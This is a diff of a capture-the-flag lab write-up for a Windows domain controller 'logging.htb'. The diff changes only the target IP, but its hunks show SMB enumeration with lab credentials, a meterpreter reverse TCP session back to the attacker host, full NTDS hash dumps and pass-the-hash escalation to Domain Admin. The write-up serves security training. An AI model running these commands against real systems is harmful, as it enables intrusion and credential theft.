@@ -2,7 +2,7 @@
 
 ## Machine: Logging
 
-* Target-IP: `10.129.245.130`
+* Target-IP: `10.129.62.234`
 * OS: `Windows`
 * Difficulty: `Medium`
 * Initial Creds: `wallace.everette`:`Welcome2026@`
@@ -119,12 +119,12 @@ Before proceeding, the identified domain and hostnames must be added to our loca
 
 ```bash
 # Generate hosts file
-➜ nxc smb 10.129.245.130 --generate-hosts-file /tmp/hosts.txt
-SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+➜ nxc smb 10.129.62.234 --generate-hosts-file /tmp/hosts.txt
+SMB         10.129.62.234  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 
 # Update local DNS routing
-➜ echo '10.129.245.130     DC01.logging.htb logging.htb DC01' | sudo tee -a /etc/hosts
-10.129.245.130     DC01.logging.htb logging.htb DC01
+➜ echo '10.129.62.234     DC01.logging.htb logging.htb DC01' | sudo tee -a /etc/hosts
+10.129.62.234     DC01.logging.htb logging.htb DC01
 ```
 
 ---
@@ -140,34 +140,34 @@ With the initial credentials (`wallace.everette`:`Welcome2026@`) provided for th
 ➜ nxc smb dc01.logging.htb \
     -u 'wallace.everette' -p 'Welcome2026@' \
     -M spider_plus
-SMB         10.129.245.130   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.245.130   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] Started module spidering_plus with the following options:
-SPIDER_PLUS 10.129.245.130   445    DC01             [*]  DOWNLOAD_FLAG: False
-SPIDER_PLUS 10.129.245.130   445    DC01             [*]     STATS_FLAG: True
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
-SPIDER_PLUS 10.129.245.130   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
-SPIDER_PLUS 10.129.245.130   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
-SPIDER_PLUS 10.129.245.130   445    DC01             [*]  OUTPUT_FOLDER: /home/deus/.nxc/modules/nxc_spider_plus
-SMB         10.129.245.130   445    DC01             [*] Enumerated shares
-SMB         10.129.245.130   445    DC01             Share           Permissions     Remark
-SMB         10.129.245.130   445    DC01             -----           -----------     ------
-SMB         10.129.245.130   445    DC01             ADMIN$                          Remote Admin
-SMB         10.129.245.130   445    DC01             C$                              Default share
-SMB         10.129.245.130   445    DC01             IPC$            READ            Remote IPC
-SMB         10.129.245.130   445    DC01             Logs            READ
-SMB         10.129.245.130   445    DC01             NETLOGON        READ            Logon server share
-SMB         10.129.245.130   445    DC01             SYSVOL          READ            Logon server share
-SMB         10.129.245.130   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
-SPIDER_PLUS 10.129.245.130   445    DC01             [+] Saved share-file metadata to "/home/deus/.nxc/modules/nxc_spider_plus/10.129.245.130.json".
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, IPC$, Logs, NETLOGON, SYSVOL, WSUSTemp)
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Readable Shares:  4 (IPC$, Logs, NETLOGON, SYSVOL)
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] SMB Filtered Shares:  1
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] Total folders found:  19
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] Total files found:    9
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size average:    2.2 KB
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size min:        22 B
-SPIDER_PLUS 10.129.245.130   445    DC01             [*] File size max:        8.29 KB
+SMB         10.129.62.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.62.234   445    DC01             [+] logging.htb\wallace.everette:Welcome2026@
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.62.234   445    DC01             [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.129.62.234   445    DC01             [*]     STATS_FLAG: True
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.129.62.234   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.129.62.234   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.62.234   445    DC01             [*]  OUTPUT_FOLDER: /home/deus/.nxc/modules/nxc_spider_plus
+SMB         10.129.62.234   445    DC01             [*] Enumerated shares
+SMB         10.129.62.234   445    DC01             Share           Permissions     Remark
+SMB         10.129.62.234   445    DC01             -----           -----------     ------
+SMB         10.129.62.234   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.62.234   445    DC01             C$                              Default share
+SMB         10.129.62.234   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.62.234   445    DC01             Logs            READ
+SMB         10.129.62.234   445    DC01             NETLOGON        READ            Logon server share
+SMB         10.129.62.234   445    DC01             SYSVOL          READ            Logon server share
+SMB         10.129.62.234   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
+SPIDER_PLUS 10.129.62.234   445    DC01             [+] Saved share-file metadata to "/home/deus/.nxc/modules/nxc_spider_plus/10.129.62.234.json".
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, IPC$, Logs, NETLOGON, SYSVOL, WSUSTemp)
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] SMB Readable Shares:  4 (IPC$, Logs, NETLOGON, SYSVOL)
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] SMB Filtered Shares:  1
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] Total folders found:  19
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] Total files found:    9
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] File size average:    2.2 KB
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] File size min:        22 B
+SPIDER_PLUS 10.129.62.234   445    DC01             [*] File size max:        8.29 KB
 ```
 
 ### 2.1.1 SMB Findings
@@ -232,8 +232,8 @@ First, we attempt standard NTLM authentication using NetExec:
 # Initial validation attempt (NTLM)
 ➜ nxc smb dc01.logging.htb \
     -u 'svc_recovery' -p 'Em3rg3ncyPa$$2025'
-SMB         10.129.245.130   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.245.130   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
+SMB         10.129.62.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.62.234   445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
 ```
 
 The `STATUS_ACCOUNT_RESTRICTION` error indicates that the account is prevented from logging in under the current context—often because NTLM authentication is explicitly disabled for the account (or domain-wide), forcing the use of Kerberos.
@@ -650,8 +650,8 @@ payload => windows/meterpreter/reverse_tcp
 LHOST => tun0
 LPORT => 9294
 [*] Started reverse TCP handler on 10.10.16.25:9294
-[*] Sending stage (199238 bytes) to 10.129.245.130
-[*] Meterpreter session 1 opened (10.10.16.25:9294 -> 10.129.245.130:55490) at 2026-04-22 21:59:33 +0530
+[*] Sending stage (199238 bytes) to 10.129.62.234
+[*] Meterpreter session 1 opened (10.10.16.25:9294 -> 10.129.62.234:55490) at 2026-04-22 21:59:33 +0530
 
 meterpreter > getuid
 Server username: logging\jaylee.clifton
@@ -970,23 +970,23 @@ With the password reset and the protection removed, we can pivot back to our att
 ➜ nxc smb dc01.logging.htb \
         -u administrator -p 'Password123!' \
         --ntds
-SMB         10.129.245.130    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.245.130    445    DC01             [+] logging.htb\administrator:Password123! (Pwn3d!)
-SMB         10.129.245.130    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB         10.129.245.130    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-SMB         10.129.245.130    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.129.245.130    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66ff41c8e28783a47fd7617f1f0125f0:::
-SMB         10.129.245.130    445    DC01             logging.htb\svc_recovery:2104:aad3b435b51404eeaad3b435b51404ee:fbeb47c9c100020d3b9ebaf1ce839fb3:::
-SMB         10.129.245.130    445    DC01             logging.htb\jaylee.clifton:2105:aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0:::
-SMB         10.129.245.130    445    DC01             logging.htb\monique.chip:2106:aad3b435b51404eeaad3b435b51404ee:5595521651b7510b86438f7452606abf:::
-SMB         10.129.245.130    445    DC01             logging.htb\kyson.abel:2107:aad3b435b51404eeaad3b435b51404ee:a50981f25606aeaa0d442f0fcbbce699:::
-SMB         10.129.245.130    445    DC01             logging.htb\fable.milford:2108:aad3b435b51404eeaad3b435b51404ee:26a4b1da75600cdd7a3d77789d40a889:::
-SMB         10.129.245.130    445    DC01             logging.htb\wellington.kylan:2109:aad3b435b51404eeaad3b435b51404ee:20a6efc7a20a14021a717fa06cd250f8:::
-SMB         10.129.245.130    445    DC01             logging.htb\serina.philander:2110:aad3b435b51404eeaad3b435b51404ee:42961be97eb21e2fa7664b115e2ac3af:::
-SMB         10.129.245.130    445    DC01             logging.htb\wallace.everette:2111:aad3b435b51404eeaad3b435b51404ee:40e28a964e1a6a6512d0ebc70f1ca811:::
-SMB         10.129.245.130    445    DC01             logging.htb\toby.brynleigh:2112:aad3b435b51404eeaad3b435b51404ee:ac384497550a56937cd6edd784fb221c:::
-SMB         10.129.245.130    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b4d05e08453f856b0ff4af1125157a84:::
-SMB         10.129.245.130    445    DC01             msa_health$:2113:aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
+SMB         10.129.62.234    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.62.234    445    DC01             [+] logging.htb\administrator:Password123! (Pwn3d!)
+SMB         10.129.62.234    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.62.234    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         10.129.62.234    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.62.234    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66ff41c8e28783a47fd7617f1f0125f0:::
+SMB         10.129.62.234    445    DC01             logging.htb\svc_recovery:2104:aad3b435b51404eeaad3b435b51404ee:fbeb47c9c100020d3b9ebaf1ce839fb3:::
+SMB         10.129.62.234    445    DC01             logging.htb\jaylee.clifton:2105:aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0:::
+SMB         10.129.62.234    445    DC01             logging.htb\monique.chip:2106:aad3b435b51404eeaad3b435b51404ee:5595521651b7510b86438f7452606abf:::
+SMB         10.129.62.234    445    DC01             logging.htb\kyson.abel:2107:aad3b435b51404eeaad3b435b51404ee:a50981f25606aeaa0d442f0fcbbce699:::
+SMB         10.129.62.234    445    DC01             logging.htb\fable.milford:2108:aad3b435b51404eeaad3b435b51404ee:26a4b1da75600cdd7a3d77789d40a889:::
+SMB         10.129.62.234    445    DC01             logging.htb\wellington.kylan:2109:aad3b435b51404eeaad3b435b51404ee:20a6efc7a20a14021a717fa06cd250f8:::
+SMB         10.129.62.234    445    DC01             logging.htb\serina.philander:2110:aad3b435b51404eeaad3b435b51404ee:42961be97eb21e2fa7664b115e2ac3af:::
+SMB         10.129.62.234    445    DC01             logging.htb\wallace.everette:2111:aad3b435b51404eeaad3b435b51404ee:40e28a964e1a6a6512d0ebc70f1ca811:::
+SMB         10.129.62.234    445    DC01             logging.htb\toby.brynleigh:2112:aad3b435b51404eeaad3b435b51404ee:ac384497550a56937cd6edd784fb221c:::
+SMB         10.129.62.234    445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b4d05e08453f856b0ff4af1125157a84:::
+SMB         10.129.62.234    445    DC01             msa_health$:2113:aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
 ```
 
 At this point, we own the network and every account within it, completing the total compromise of the `logging.htb` domain.
@@ -1044,11 +1044,11 @@ We can verify the exploit worked by querying LDAP with **NetExec**, passing the 
 ➜ nxc ldap dc01.logging.htb \
         -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5' \
         --groups 'Domain Admins'
-LDAP        10.129.245.130    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
-LDAP        10.129.245.130    389    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5
-LDAP        10.129.245.130    389    DC01             Administrator
-LDAP        10.129.245.130    389    DC01             toby.brynleigh
-LDAP        10.129.245.130    389    DC01             msa_health$
+LDAP        10.129.62.234    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
+LDAP        10.129.62.234    389    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5
+LDAP        10.129.62.234    389    DC01             Administrator
+LDAP        10.129.62.234    389    DC01             toby.brynleigh
+LDAP        10.129.62.234    389    DC01             msa_health$
 ```
 
 With Domain Admin privileges successfully granted to an account we hold the hash for, we can immediately utilize Pass-the-Hash (PtH) to dump the active directory database (`NTDS.dit`) and compromise the entire network.
@@ -1057,10 +1057,10 @@ With Domain Admin privileges successfully granted to an account we hold the hash
 ➜ nxc smb dc01.logging.htb \
         -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5' \
         --ntds
-SMB         10.129.245.130    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.245.130    445    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
-SMB         10.129.245.130    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
-SMB         10.129.245.130    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
+SMB         10.129.62.234    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.62.234    445    DC01             [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
+SMB         10.129.62.234    445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.129.62.234    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0c1d1bed9126632f5f1f2b3f790bdb5:::
 ```
 
 ---
